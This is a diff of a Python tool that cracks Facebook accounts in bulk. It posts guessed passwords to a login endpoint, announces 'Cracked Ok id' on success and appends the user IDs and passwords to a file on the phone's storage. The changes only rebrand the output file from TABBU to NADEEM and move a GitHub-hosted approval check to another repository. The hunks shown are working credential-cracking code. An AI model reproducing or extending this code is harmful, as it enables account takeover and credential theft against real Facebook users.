@@ -901,12 +901,12 @@ def login3(uid):
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -980,7 +980,7 @@ def meyexudi():
   uuid = "md"+str(os.getuid())+"NADEEM"+str(os.getuid())+"FREE.TOOL"
   id = ''.join(uuid)
   try:
-    httpCaht = requests.get(f"https://github.com/Tabbu-Arain/Tabbu-xd/blob/main/approval.txt").text
+    httpCaht = requests.get(f"https://github.com/BROKEN-NADEEM/APPROVAL").text
     if id in httpCaht:
       msg = str(os.geteuid())
       print()
